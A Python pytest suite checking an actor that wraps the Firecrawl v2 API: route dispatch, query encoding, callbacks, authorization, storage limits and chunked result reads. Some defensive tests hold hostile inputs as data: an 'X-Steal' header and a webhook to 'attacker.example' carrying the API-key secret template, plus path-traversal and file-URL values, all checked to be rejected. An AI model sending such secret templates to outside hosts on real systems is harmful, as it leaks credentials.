"""Offline contract checks: real SDK dispatch, callbacks, and caller result reads."""

import json
from pathlib import Path

import actors.scrape.main as fc
import pytest
from conftest import ACTOR, BUYER, HIRE, OWNER
from cowboy_sdk import PermissionDeniedError, codec, continuation, runtime

ROUTES = json.loads((Path(__file__).resolve().parents[1] / "openapi_routes.json").read_text())[
    "routes"
]
VENDOR = {
    "success": True,
    "data": {"markdown": "hello 🤠", "metadata": {"title": "Page"}},
}


def test_event_fixture_preserves_host_schema_contract(host):
    schema = b"\x01" * 32
    result = runtime.emit_event("fixture.schema", {"ok": True}, schema=schema)
    assert set(result) >= {"emit_id", "sync_outcomes", "deferred_subs"}
    assert host.events == [("fixture.schema", {"ok": True})]
    with pytest.raises(host.HostError) as exc:
        host.subscribe_event(ACTOR, b"fixture.schema", "on_event", 50_000, 0, schema=b"\x02" * 32)
    assert exc.value.code == 117


def submit(actor, host, handler="api", **payload):
    host.set_context(
        sender=BUYER, tx_hash=(len(host.get_send_log()) + 1).to_bytes(32, "big")
    )
    accepted = codec.decode(
        getattr(actor, handler)(codec.encode({"hire_id": 42, **payload}))
    )
    job = codec.decode(host.get_send_log()[-1]["payload"])
    return accepted, job


def resume(host, job, result):
    host.set_context(sender=ACTOR)
    return codec.decode(
        fc._run_request__resume(
            codec.encode(
                {
                    "cid": job["cid"],
                    "reply_handler": job["reply_handler"],
                    "result": result,
                }
            )
        )
    )


def read(actor, host, request_id, **fields):
    host.set_context(sender=BUYER)
    return codec.decode(
        actor.get_result(
            codec.encode({"request_id": request_id, "hire_id": 42, **fields})
        )
    )


@pytest.mark.parametrize("operation,route", ROUTES.items())
def test_exact_route_dispatch(actor, host, operation, route):
    method, path = route
    ids = {
        "id": "id value",
        "jobId": "job value",
        "monitorId": "mon value",
        "checkId": "check value",
        "sessionId": "sess value",
        "snapshotId": "snap value",
    }
    accepted, job = submit(actor, host, operation=operation, **ids)
    assert accepted["status"] == "pending" and "output" not in accepted
    assert job["reply_handler"] == "_run_request__resume"
    request = job["payload"]["kwargs"]
    expected_path = path.format(
        **{key: value.replace(" ", "%20") for key, value in ids.items()}
    )
    assert request["url"] == "https://api.firecrawl.dev/v2" + expected_path
    assert request["method"] == method
    assert request["headers"]["Authorization"] == "Bearer ${FIRECRAWL_API_KEY}"
    assert request["secrets"] == [["0x" + OWNER.hex(), "FIRECRAWL_API_KEY"]]
    assert request["hire"] == {
        key: HIRE[key]
        for key in ("hire_id", "declaration_id", "version", "artifact_id")
    }
    if method in ("POST", "PATCH", "PUT"):
        assert request["headers"]["Content-Type"] == "application/json"
        assert json.loads(request["body"]) == {
            key: value for key, value in ids.items() if "{" + key + "}" not in path
        }
    else:
        assert "body" not in request and "Content-Type" not in request["headers"]
    assert "timeout_ms" not in request


def test_route_inventory_matches_pinned_vendor_contract():
    assert fc.API_OPERATIONS == {name: tuple(route) for name, route in ROUTES.items()}
    assert len(set(fc.API_OPERATIONS.values())) == len(ROUTES)


@pytest.mark.parametrize(
    "query,expected",
    [
        ({"query": "How does C/C++ work?"}, "query=How%20does%20C%2FC%2B%2B%20work%3F"),
        (
            {"query": "parser", "repos": ["firecrawl/firecrawl"]},
            "query=parser&repos=firecrawl%2Ffirecrawl",
        ),
        (
            {"archived": False, "k": 0, "types": ["doc", "readme"]},
            "archived=false&k=0&types=doc&types=readme",
        ),
        (
            {"query": "a#b & c=🤠", "language": ""},
            "language=&query=a%23b%20%26%20c%3D%F0%9F%A4%A0",
        ),
    ],
)
def test_query_encoding(actor, host, query, expected):
    _, job = submit(actor, host, operation="developer_search", query_params=query)
    assert (
        job["payload"]["kwargs"]["url"]
        == "https://api.firecrawl.dev/v2/search/developer?" + expected
    )


@pytest.mark.parametrize("handler", ["scrape", "api"])
def test_passthrough_and_real_callback(actor, host, handler):
    body = {
        "url": "https://example.com",
        "formats": ["markdown", {"type": "json", "prompt": "products"}],
        "headers": {"X-Site-Token": "caller-owned"},
        "onlyMainContent": False,
        "actions": [{"type": "wait", "milliseconds": 10}],
    }
    payload = dict(body, operation="scrape") if handler == "api" else body
    accepted, job = submit(actor, host, handler, **payload)
    assert json.loads(job["payload"]["kwargs"]["body"]) == body
    assert read(actor, host, accepted["request_id"])["status"] == "pending"
    resume(host, job, VENDOR)
    result = read(actor, host, accepted["request_id"])
    assert result["status"] == "ok"
    assert result["output"] == (
        VENDOR
        if handler == "scrape"
        else {"ok": True, "operation": "scrape", "data": VENDOR}
    )
    if handler == "scrape":
        assert (
            codec.decode(actor.get_last_results(b""))["results"][0]["url"]
            == "https://example.com"
        )
    with pytest.raises(continuation.ContinuationNotFoundError):
        continuation.load_cont(job["cid"])


@pytest.mark.parametrize("handler", ["scrape", "api"])
@pytest.mark.parametrize(
    "failure",
    [
        {"success": False, "error": "Insufficient credits"},
        {"raw": "PGh0bWw+QmFkIEdhdGV3YXk8L2h0bWw+", "content_type": "text/html"},
        None,
    ],
)
def test_failures_replace_last_success(actor, host, handler, failure):
    payload = {
        "url": "https://example.com",
        **({"operation": "scrape"} if handler == "api" else {}),
    }
    first, job = submit(actor, host, handler, **payload)
    resume(host, job, VENDOR)
    second, job = submit(actor, host, handler, **payload)
    resume(host, job, failure)
    assert read(actor, host, first["request_id"])["status"] == "ok"
    result = read(actor, host, second["request_id"])
    assert result["status"] == "error" and result["ok"] is False
    assert codec.decode(actor.get_last_output(b""))["ok"] is False
    if handler == "scrape":
        assert codec.decode(actor.get_last_results(b""))["results"] == []


@pytest.mark.parametrize("handler", ["scrape", "api"])
@pytest.mark.parametrize(
    "extra",
    [
        {"headers": {"X-Steal": "${FIRECRAWL_API_KEY}"}},
        {
            "webhook": {
                "url": "https://attacker.example",
                "headers": {"X-Steal": "${FIRECRAWL_API_KEY}"},
            }
        },
    ],
)
def test_secret_templates_never_dispatch(actor, host, handler, extra):
    payload = {"hire_id": 42, "url": "https://example.com", **extra}
    if handler == "api":
        payload["operation"] = "scrape"
    assert codec.decode(getattr(actor, handler)(codec.encode(payload)))["ok"] is False
    assert host.get_send_log() == [] and actor.storage[fc.KEY_CALLS] == 0


@pytest.mark.parametrize("handler", ["scrape", "api"])
def test_unactivated_and_stolen_hires_do_not_dispatch(actor, host, handler):
    payload = {
        "url": "https://example.com",
        **({"operation": "scrape"} if handler == "api" else {}),
    }
    assert (
        codec.decode(getattr(actor, handler)(codec.encode(dict(payload, hire_id=43))))[
            "ok"
        ]
        is False
    )
    host.set_context(sender=b"\x44" * 20)
    with pytest.raises(ValueError, match="registered hirer"):
        getattr(actor, handler)(codec.encode(dict(payload, hire_id=42)))
    assert host.get_send_log() == [] and actor.storage[fc.KEY_CALLS] == 0


@pytest.mark.parametrize("handler", ["scrape", "api"])
def test_request_budget_applies_to_both_handlers(actor, host, handler):
    payload = {"hire_id": 42, "url": "https://example.com", "pad": "x" * 28_000}
    if handler == "api":
        payload["operation"] = "scrape"
    with pytest.raises(ValueError, match="request exceeds"):
        getattr(actor, handler)(codec.encode(payload))
    assert host.get_send_log() == [] and actor.storage[fc.KEY_CALLS] == 0


@pytest.mark.parametrize(
    "bad", ["", ".", "..", "../admin", "x?y=1", "x#fragment", "a/b"]
)
def test_path_segments_cannot_change_the_route(actor, host, bad):
    with pytest.raises(ValueError, match="invalid"):
        actor.api(codec.encode({"hire_id": 42, "operation": "get_crawl", "id": bad}))
    assert host.get_send_log() == []


@pytest.mark.parametrize(
    "vendor",
    [
        {"success": False, "error": "E" * 37_000},
        {"success": True, "data": {"markdown": "🤠" * 9_800}},
        {"success": True, "data": [0.0] * 12_000},
    ],
)
def test_complete_response_and_receipt_chunks_fit_limits(actor, host, vendor):
    accepted, job = submit(actor, host, operation="scrape", url="https://example.com")
    resume(host, job, vendor)
    result = read(actor, host, accepted["request_id"])
    encoded = codec.encode(result)
    assert len(encoded) <= 38_000
    chunks = bytearray()
    while len(chunks) < len(encoded):
        read(actor, host, accepted["request_id"], receipt_offset=len(chunks))
        name, event = host.events[-1]
        assert name == "wrapper.result_chunk"
        assert event["request_id"] == accepted["request_id"] and event["hire_id"] == 42
        assert event["offset"] == len(chunks) and event["total"] == len(encoded)
        chunks.extend(event["data"])
    assert bytes(chunks) == encoded
    if vendor.get("success") is False:
        assert result["status"] == "error" and result["output"]["error"]


def test_overlapping_requests_and_reads_keep_their_own_results(actor, host):
    first, first_job = submit(actor, host, operation="map", url="https://first.example")
    second, second_job = submit(
        actor, host, operation="map", url="https://second.example"
    )
    resume(host, second_job, {"success": True, "links": ["https://second.example"]})
    assert read(actor, host, first["request_id"])["status"] == "pending"
    resume(host, first_job, {"success": True, "links": ["https://first.example"]})
    for accepted, url in [
        (first, "https://first.example"),
        (second, "https://second.example"),
    ]:
        assert read(actor, host, accepted["request_id"])["output"]["data"]["links"] == [
            url
        ]
    host.set_context(sender=b"\x44" * 20)
    assert (
        codec.decode(
            actor.get_result(
                codec.encode(
                    {
                        "hire_id": 42,
                        "request_id": first["request_id"],
                        "receipt_offset": 0,
                    }
                )
            )
        )["ok"]
        is False
    )
    assert read(actor, host, first["request_id"], hire_id=43)["ok"] is False


def test_callback_authentication_duplicate_and_same_transaction(actor, host):
    accepted, job = submit(actor, host, operation="map")
    payload = codec.encode({"hire_id": 42, "url": "https://example.com"})
    assert codec.decode(actor.scrape(payload))["ok"] is False
    callback = codec.encode({"cid": job["cid"], "result": VENDOR})
    for sender in (BUYER, OWNER, b"\x44" * 20):
        host.set_context(sender=sender)
        with pytest.raises(PermissionDeniedError):
            fc._run_request__resume(callback)
    assert read(actor, host, accepted["request_id"])["status"] == "pending"
    resume(host, job, VENDOR)
    assert resume(host, job, {"success": False, "error": "late"})["ok"] is False
    assert read(actor, host, accepted["request_id"])["status"] == "ok"


def test_capacity_preserves_completed_results_and_reclaims_timeouts(actor, host):
    requests = [
        submit(actor, host, operation="map") for _ in range(fc.MAX_RETAINED_REQUESTS)
    ]
    first, first_job = requests[0]
    resume(host, first_job, VENDOR)
    host.set_context(sender=BUYER, tx_hash=b"\xff" * 32)
    rejected = codec.decode(
        actor.api(codec.encode({"hire_id": 42, "operation": "map"}))
    )
    assert rejected["ok"] is False and "capacity" in rejected["error"]
    assert read(actor, host, first["request_id"])["status"] == "ok"
    host.set_block_height(host.current_block() + fc.REQUEST_LIFETIME_BLOCKS)
    pending, pending_job = requests[1]
    expired = read(actor, host, pending["request_id"])
    assert expired["status"] == "error" and "deadline" in expired["output"]["error"]
    assert resume(host, pending_job, VENDOR)["ok"] is False
    host.set_block_height(host.current_block() + fc.RESULT_RETENTION_BLOCKS)
    assert submit(actor, host, operation="map")[0]["status"] == "pending"


def test_hire_records_are_idempotent_authorized_and_separately_bounded(actor, host):
    with pytest.raises(ValueError, match="registrar"):
        actor.register_hire(codec.encode(HIRE))
    host.set_context(sender=OWNER)
    actor.register_hire(codec.encode(HIRE))
    assert actor.storage[fc.KEY_HIRE_COUNT] == 1
    with pytest.raises(ValueError, match="different data"):
        actor.register_hire(codec.encode(dict(HIRE, version=4)))
    for hire_id in range(1, 513):
        actor.register_hire(codec.encode(dict(HIRE, hire_id=hire_id)))
    assert actor.storage[fc.KEY_HIRE_COUNT] == 512
    with pytest.raises(ValueError, match="capacity"):
        actor.register_hire(codec.encode(dict(HIRE, hire_id=513)))
    assert max(len(value) for value in host._storage.values()) < 1024
    assert actor.storage["hire:512"]["hire_id"] == 512


def test_all_retained_results_and_hires_fit_base_storage(actor, host):
    host.set_context(sender=OWNER)
    for hire_id in range(1, 513):
        actor.register_hire(codec.encode(dict(HIRE, hire_id=hire_id)))
    for _ in range(16):
        _, job = submit(actor, host, operation="scrape")
        resume(host, job, {"success": True, "data": {"markdown": "x" * 40_000}})
    assert sum(len(k) + len(v) for k, v in host._storage.items()) < 1_048_576


def test_late_callback_records_timeout_without_a_prior_cleanup(actor, host):
    accepted, job = submit(actor, host, operation="map")
    host.set_block_height(host.current_block() + 150)
    resume(host, job, VENDOR)
    result = read(actor, host, accepted["request_id"])
    assert result["status"] == "error" and "deadline" in result["output"]["error"]


def test_live_reader_assembles_independent_cbor_and_rejects_wrong_chunks(monkeypatch):
    from types import SimpleNamespace

    import cbor2
    import live_firecrawl as live

    args = SimpleNamespace(hire_id=42, wait_seconds=300)
    expected = {
        "request_id": 7,
        "hire_id": 42,
        "status": "ok",
        "output": {"score": 1.25, "text": "🤠" * 2000},
    }
    encoded = cbor2.dumps(expected)

    def chunk(args, handler, payload, event_name, **kwargs):
        offset = payload["receipt_offset"]
        assert handler == "get_result" and event_name == "wrapper.result_chunk"
        return {
            "request_id": 7,
            "hire_id": 42,
            "offset": offset,
            "total": len(encoded),
            "data": encoded[offset : offset + 3900],
        }

    monkeypatch.setattr(live, "execute", chunk)
    assert live.get_result(args, 7) == expected
    for bad in (
        {"request_id": 8},
        {"hire_id": 43},
        {"offset": 1},
        {"total": 38_001},
        {"data": b""},
    ):
        monkeypatch.setattr(
            live, "execute", lambda *a, bad=bad, **k: dict(chunk(*a, **k), **bad)
        )
        with pytest.raises(ValueError):
            live.get_result(args, 7)
    with pytest.raises(ValueError, match="trailing"):
        live.decode(encoded + b"\x00")


def test_live_receipt_requires_exact_actor_event_and_success():
    import cbor2
    import live_firecrawl as live

    actor = "0x" + ACTOR.hex()
    event = [
        actor,
        "wrapper.request_accepted",
        "0x" + cbor2.dumps({"request_id": 7}).hex(),
    ]
    assert live.receipt_event(
        {"status": "Success", "events": [event]}, actor, event[1]
    ) == {"request_id": 7}
    for receipt in (
        {"status": "Failed", "events": [event]},
        {"status": "Success", "events": [event, event]},
        {"status": "Success", "events": [["0x" + BUYER.hex(), *event[1:]]]},
    ):
        with pytest.raises(ValueError):
            live.receipt_event(receipt, actor, event[1])


def test_live_wait_keeps_pending_request_and_reports_timeout(monkeypatch):
    from types import SimpleNamespace

    import live_firecrawl as live

    args = SimpleNamespace(hire_id=42, wait_seconds=3)
    accepted = {"ok": True, "request_id": 7, "hire_id": 42, "status": "pending"}
    monkeypatch.setattr(live, "execute", lambda *a: accepted)
    reads = []

    def pending(args, request_id, **kwargs):
        reads.append(request_id)
        return {"request_id": request_id, "hire_id": 42, "status": "pending"}

    times = iter([0, 1, 1, 2, 2, 4])
    monkeypatch.setattr(live, "get_result", pending)
    monkeypatch.setattr(live.time, "monotonic", lambda: next(times))
    monkeypatch.setattr(live.time, "sleep", lambda _: None)
    with pytest.raises(TimeoutError, match="request 7 is still pending"):
        live.invoke(args, "api", {"operation": "map"})
    assert reads == [7, 7]


def test_live_comparison_rejects_bad_credentials_and_checks_documented_credit_shape():
    import live_firecrawl as live

    error = {"success": False, "error": "invalid API key"}
    result = {"status": "error", "output": {"data": error}}
    with pytest.raises(ValueError, match="expected"):
        live.compare("scrape", error, result, True)
    credit = {"success": True, "data": {"remainingCredits": 123}}
    live.compare(
        "credit_usage", credit, {"status": "ok", "output": {"data": credit}}, True
    )
    malformed = {"success": True, "remainingCredits": 123}
    with pytest.raises(ValueError, match="malformed"):
        live.compare(
            "credit_usage",
            malformed,
            {"status": "ok", "output": {"data": malformed}},
            True,
        )


def test_openapi_audit_rejects_route_and_server_drift():
    import check_openapi

    pinned = json.loads(check_openapi.FIXTURE.read_text())
    schema = {"servers": [{"url": "https://api.firecrawl.dev/v2"}], "paths": {}}
    for method, path in ROUTES.values():
        schema["paths"].setdefault(path, {})[method.lower()] = {}
    assert check_openapi.check(schema, pinned) == 54
    for method in ("get", "head", "options", "trace"):
        schema["paths"]["/new"] = {method: {}}
        with pytest.raises(ValueError, match="route drift"):
            check_openapi.check(schema, pinned)
    del schema["paths"]["/new"]
    schema["servers"] = [{"url": "https://wrong.example/v2"}]
    with pytest.raises(ValueError, match="server"):
        check_openapi.check(schema, pinned)


def test_body_and_query_share_request_budget(actor, host):
    with pytest.raises(ValueError, match="request exceeds"):
        actor.api(
            codec.encode(
                {
                    "hire_id": 42,
                    "operation": "scrape",
                    "pad": "x" * 20_000,
                    "query_params": {"q": "x" * 20_000},
                }
            )
        )
    assert host.get_send_log() == []


def test_live_execute_reads_the_labeled_transaction_receipt(monkeypatch):
    from types import SimpleNamespace
    from urllib.error import HTTPError

    import cbor2
    import live_firecrawl as live

    args = SimpleNamespace(
        rpc="http://node",
        actor="0x" + ACTOR.hex(),
        cowboy="cowboy",
        wallet_key=Path("wallet.key"),
    )
    tx = "0x" + "12" * 32
    accepted = {"request_id": 7}

    def run(command, **kwargs):
        assert command[:3] == ["cowboy", "actor", "execute"]
        assert "--no-wait" in command and kwargs["env"]["COWBOY_RPC_URL"] == args.rpc
        return SimpleNamespace(stdout=f"Actor: {args.actor}\nTransaction hash: {tx}\n")

    requests = []

    def receipt(url, **kwargs):
        requests.append(url)
        if len(requests) == 1:
            raise HTTPError(url, 404, "pending", {}, None)
        return {
            "status": "Success",
            "events": [
                [
                    args.actor,
                    "wrapper.request_accepted",
                    "0x" + cbor2.dumps(accepted).hex(),
                ]
            ],
        }

    monkeypatch.setattr(live.subprocess, "run", run)
    monkeypatch.setattr(live, "request", receipt)
    monkeypatch.setattr(live.time, "sleep", lambda _: None)
    assert live.execute(args, "api", {}, "wrapper.request_accepted") == accepted
    assert requests == [f"http://node/transaction/{tx}/receipt"] * 2


def test_chunk_read_does_not_load_other_retained_outputs(actor, host, monkeypatch):
    for _ in range(16):
        _, job = submit(actor, host, operation="scrape")
        resume(host, job, {"success": True, "data": {"markdown": "x" * 40_000}})
    loaded = []
    original = host.get_state

    def get_state(key):
        value = original(key)
        loaded.append(len(value) if value else 0)
        return value

    monkeypatch.setattr(host, "get_state", get_state)
    read(actor, host, 1, receipt_offset=0)
    # At most the requested record twice, plus its small index and SDK metadata.
    assert sum(loaded) < 80_000


def test_live_client_reports_accepted_id_before_a_read_failure(monkeypatch, capsys):
    from types import SimpleNamespace

    import live_firecrawl as live

    args = SimpleNamespace(hire_id=42, wait_seconds=300)
    monkeypatch.setattr(
        live,
        "execute",
        lambda *a, **k: {
            "ok": True,
            "request_id": 7,
            "hire_id": 42,
            "status": "pending",
        },
    )

    def offline(*args, **kwargs):
        raise OSError("connection lost")

    monkeypatch.setattr(live, "get_result", offline)
    with pytest.raises(OSError):
        live.invoke(args, "api", {"operation": "map"})
    assert "request 7" in capsys.readouterr().err


def test_live_chunk_reads_share_one_wait_deadline(monkeypatch):
    from types import SimpleNamespace

    import cbor2
    import live_firecrawl as live

    args = SimpleNamespace(
        hire_id=42,
        wait_seconds=5,
        rpc="http://node",
        actor="0x" + ACTOR.hex(),
        cowboy="cowboy",
        wallet_key=Path("wallet.key"),
    )
    encoded = cbor2.dumps({"request_id": 7, "hire_id": 42, "status": "ok"})
    clock = [0]
    submits = []
    tx = "0x" + "12" * 32

    def run(command, **kwargs):
        submits.append(command)
        return SimpleNamespace(stdout=f"Transaction hash: {tx}\n")

    def request(url, **kwargs):
        offset = 0 if len(submits) == 1 else 10
        chunk = {
            "request_id": 7,
            "hire_id": 42,
            "offset": offset,
            "total": len(encoded),
            "data": encoded[:10] if offset == 0 else encoded[10:],
        }
        clock[0] += 6
        return {
            "status": "Success",
            "events": [[args.actor, "wrapper.result_chunk", cbor2.dumps(chunk).hex()]],
        }

    monkeypatch.setattr(live.time, "monotonic", lambda: clock[0])
    monkeypatch.setattr(live.subprocess, "run", run)
    monkeypatch.setattr(live, "request", request)
    with pytest.raises(TimeoutError):
        live.get_result(args, 7)
    assert len(submits) == 1


def test_actor_direct_imports_use_supported_node_modules():
    import ast

    # Node's deterministic import policy permits these two modules. In
    # particular, urllib.parse is available to this host but not to the Actor.
    tree = ast.parse(Path(fc.__file__).read_text())
    imports = {
        node.module.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom)
    }
    imports.update(
        alias.name.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.Import)
        for alias in node.names
    )
    assert imports <= {"json", "cowboy_sdk"}


@pytest.mark.parametrize(
    "query",
    [
        "".join(chr(i) for i in range(128)),
        "🤠 café 漢字 ? & = / # + % [ ] @ ! $ ' ( ) * , ; : ~",
    ],
)
def test_actor_query_encoder_matches_host_standard_library(actor, host, query):
    from urllib.parse import quote

    _, job = submit(
        actor, host, operation="developer_search", query_params={"q": query}
    )
    assert job["payload"]["kwargs"][
        "url"
    ] == "https://api.firecrawl.dev/v2/search/developer?q=" + quote(query, safe="")


@pytest.mark.parametrize(
    "url",
    [
        "https://example.com?q=a/b#fragment",
        "HTTP://example.com:8080/page",
        "https://[2001:db8::1]/page",
        "https://user:pass@example.com",
    ],
)
def test_native_scrape_preserves_http_url(actor, host, url):
    _, job = submit(actor, host, "scrape", url=url)
    assert json.loads(job["payload"]["kwargs"]["body"])["url"] == url


@pytest.mark.parametrize(
    "url",
    [
        "https://",
        "https://?x=a/b",
        "https://#fragment",
        "http://:80",
        "http://[",
        "file:///tmp/a",
        "https://exa mple.com",
        "https://example.com\x00",
    ],
)
def test_invalid_scrape_url_does_not_dispatch(actor, host, url):
    assert (
        codec.decode(actor.scrape(codec.encode({"hire_id": 42, "url": url})))["ok"]
        is False
    )
    assert host.get_send_log() == []


@pytest.mark.parametrize("handler", ["scrape", "api"])
@pytest.mark.parametrize("number", [float("nan"), float("inf"), float("-inf")])
def test_non_json_numbers_are_rejected_before_dispatch(actor, host, handler, number):
    payload = {"hire_id": 42, "url": "https://example.com", "timeout": number}
    if handler == "api":
        payload["operation"] = "scrape"
    with pytest.raises(ValueError):
        getattr(actor, handler)(codec.encode(payload))
    assert host.get_send_log() == []


def test_invalid_vendor_json_cannot_be_labeled_success(actor, host):
    accepted, job = submit(actor, host, operation="map")
    resume(host, job, {"success": True, "data": float("nan")})
    result = read(actor, host, accepted["request_id"])
    assert result["status"] == "error" and result["output"]["ok"] is False


def test_live_client_reads_actual_actor_chunks_with_maximum_ids(
    actor, host, monkeypatch
):
    from types import SimpleNamespace

    import live_firecrawl as live

    maximum_id = 2**64 - 1
    host.set_context(sender=OWNER)
    actor.register_hire(codec.encode(dict(HIRE, hire_id=maximum_id)))
    actor.storage[fc.KEY_CALLS] = maximum_id - 1
    host.set_block_height(2**32)
    accepted, job = submit(
        actor, host, operation="scrape", hire_id=maximum_id, url="https://example.com"
    )
    assert accepted["request_id"] == maximum_id
    resume(
        host, job, {"success": True, "data": {"markdown": "x" * 37_000, "score": 1.5}}
    )

    def execute(args, handler, payload, event_name, **kwargs):
        host.set_context(sender=BUYER)
        actor.get_result(codec.encode(payload))
        name, chunk = host.events[-1]
        assert name == event_name
        return chunk

    monkeypatch.setattr(live, "execute", execute)
    result = live.get_result(
        SimpleNamespace(hire_id=maximum_id, wait_seconds=300), maximum_id
    )
    assert result["status"] == "ok" and result["request_id"] == maximum_id
    assert result["output"]["data"]["data"]["score"] == 1.5
    assert result["output"]["data"]["_cowboy"]["truncated"] is True
